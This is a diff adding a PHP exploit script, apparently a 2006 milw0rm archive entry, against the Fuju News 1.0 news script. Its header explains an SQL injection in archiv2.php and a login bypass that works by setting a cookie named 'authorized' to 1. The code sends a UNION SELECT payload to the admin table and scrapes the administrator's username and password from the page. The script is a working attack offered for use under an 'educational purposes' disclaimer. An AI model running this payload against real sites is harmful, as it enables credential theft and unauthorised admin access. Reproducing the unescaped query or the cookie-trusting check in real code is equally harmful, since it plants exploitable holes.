@@ -1,0 +1,91 @@
+<?php /*
+
+ |---==============================================================---|
+ |                          /\¯\__       /\¯\                         |   
+ |     ____    ___      __  \ \  _\   ___\ \ \___      __    ___      |    
+ |    /  __\ /  _  \  / __ \ \ \ \/  / ___\ \  _  \  / __ \/\  __\    |    
+ |   /\__,  \/\ \/\ \/\ \_\ \_\ \ \_/\ \__/\ \ \ \ \/\  __/\ \ \/     |     
+ |   \/\____/\ \_\ \_\ \__/ \_\\ \__\ \____\\ \_\ \_\ \____\\ \_\     |      
+ |    \/___/  \/_/\/_/\/__/\/_/ \/__/\/____/ \/_/\/_/\/____/ \/_/     |     
+ |                                     >> Internet Security           |                         
+ |---==============================================================---|
+ 
+        title: fuju news 1.0 remote sql injection
+      release: 2006-04-16
+       author: snatcher [snatcher at gmx.ch]
+      country: switzerland  |+|
+	  
+  application: Fuju News 1.0
+  description: a php / mysql based newsscript
+     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=243
+  description: you can get the password with a simple sql injection.
+       greets: honkey, str0ke <- good exploit publisher :),
+			   all security guys and coders over the world
+ terms of use: this exploit is just for educational purposes, do not use it for illegal acts.
+
+
+---------------------------- archiv2.php - line 25 --------------------------------------
+$result1 =@mysql_query("SELECT * FROM news_sql WHERE ID LIKE $ID");
+-----------------------------------------------------------------------------------------
+
+because this $ID isn't escaped correctly you can insert malicious sql code,
+i.e. with a union operator.
+
+
+title: fuju news 1.0 restriction bypass
+
+------------------------- edit_kategorie.php - line 19 ----------------------------------
+$authorized=$HTTP_COOKIE_VARS['authorized'];
+-----------------------------------------------------------------------------------------
+
+that's the mistake of the code. you only have to create a session cookie named 'authorized'
+with the value 1, and you are logged in.
+
+*/
+/*********************** CONFIGURATION ****************************/
+
+$PATH_TO_FILE  = 'http://yourhost.com/fuju/archiv2.php';           // in example: http://yourhost.com/fuju/archiv2.php
+$TABLE_PREFIX  = '';                                               // default: empty
+$GET_VARS      = '?ID=';                                           // do not change
+$SQL_INJECTION = '-666 union select pw,0,0,benutzer,0,0,pw from '. // do not change
+                 $TABLE_PREFIX.'admin_sql /*';
+
+
+/**************************** MAIN ********************************/
+
+$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\'t open host!'); 
+foreach ($file_array as $now)                               
+	$html_content .= $now;
+
+$html_content = str_castrate($html_content);
+
+preg_match_all("!Autor:</span></strong></td></tr><trbordercolorlight='#2E2E2E'bordercolordark='#848484'>".
+               "<tdalign=leftvalign=topbgcolor=\"#49535C\"><divalign='center'><spanclass='Stil2'>(.*?)</div>!",
+			   $html_content,$username); /* gets username */
+preg_match_all("!Kategorie:</span></strong></p></div></td></tr><trbordercolorlight='#2E2E2E'bordercolordark=".
+               "'#848484'><tdalign=leftvalign=topbgcolor=\"#49535C\"><divalign='center'><fontclass=\"content\"".
+			   "><spanclass='Stil2'>(.*?)</span>!", 
+                $html_content,$password); /* gets password */
+
+if ($username[1][0] && $password[1][0]) {
+	echo 'username: <b>'.$username[1][0].'</b><br>';
+	echo 'password: <b>'.$password[1][0].'</b>';
+}else {
+	echo 'exploit failed! <br>';
+}
+echo '<br><br><br><br><br>
+======================================================================<br>
+exploit: fuju news 1.0 remote sql injection<br>
+release: 2006-04-16<br>
+author: snatcher [snatcher at gmx.ch]<br>
+======================================================================';
+
+function str_castrate($string) {
+	$string = str_replace("\n", '', $string);
+	$string = str_replace("\r", '', $string);
+	$string = str_replace(" ", '', $string);
+	return $string;
+}
+?>
+
+# milw0rm.com [2006-04-16]
